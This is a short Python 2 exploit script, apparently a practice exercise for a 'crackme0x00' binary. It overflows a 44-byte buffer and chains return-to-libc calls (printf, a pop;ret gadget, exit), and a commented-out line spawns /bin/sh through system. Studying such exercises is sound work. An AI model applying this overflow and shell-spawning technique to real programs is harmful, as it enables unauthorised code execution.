#!/usr/bin/env python2

import os
import struct
import subprocess as sp

def p32(n):
    return struct.pack("<I", n)   # < little-endian;  I unsigned int

def p64(n):
    return struct.pack("<Q", n)   # Q unsigned long long

def ps(n,s):
    return struct.pack(str(n)+'s', s)   # s  char[]

if __name__ == '__main__':

    # assert is used to check if binary is correct
    assert p32(0x12345678) == b'\x78\x56\x34\x12'                     # 4 bytes in m32 
    assert p64(0x12345678) == b'\x78\x56\x34\x12\x00\x00\x00\x00'     # 8 bytes in m64
    assert ps(4, 'aaaa') == b'\x61\x61\x61\x61'

    cmds = ["./crackme0x00"]
    env = os.environ

    buf = ps(44,"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHAAAABBBBCCCC")

    # input = buf + p32(0xf7e43410) + p32(0x12345678) + p32(0x08048879)  # printf + dummy + password OK
    # input = buf + p32(0xf7e36310) + p32(0x12345678) + p32(0xf7f58cec)  # system + dummy + /bin/sh
    input = buf + p32(0xf7e43410) + p32(0x080484c9) + p32(0x08048879)    # printf + pop;ret + password OK
    input = input + p32(0xf7e29260) + p32(0x12345678) + p32(0x00000000)  # exit + dummy + 0

    p = sp.Popen(cmds, env=env, stdin=sp.PIPE, universal_newlines=False)
    p.communicate(input)
    p.wait()
